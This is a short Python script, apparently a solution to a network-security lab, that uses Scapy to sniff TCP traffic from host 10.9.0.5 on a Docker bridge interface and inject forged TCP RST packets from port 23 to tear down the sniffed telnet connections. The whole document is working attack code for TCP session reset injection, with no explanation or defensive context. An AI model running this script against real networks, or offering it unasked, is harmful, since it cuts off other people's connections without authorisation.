#!/usr/bin/env python3

from scapy.all import *

def spoof_pkt(pkt):
    ip = IP(src=pkt[IP].src, dst=pkt[IP].dst)
    tcp = TCP(
        sport=23,
        dport=pkt[TCP].dport,
        flags="R",
        seq=pkt[TCP].seq + 1
    )
    pkt = ip / tcp
    ls(pkt)
    send (pkt, verbose=0)

def main():
    f = f"tcp and src host 10.9.0.5"
    pkt = sniff(
        iface="br-27b5f07b4373",
        filter=f,
        prn=spoof_pkt
    )

if __name__ == "__main__":
    main()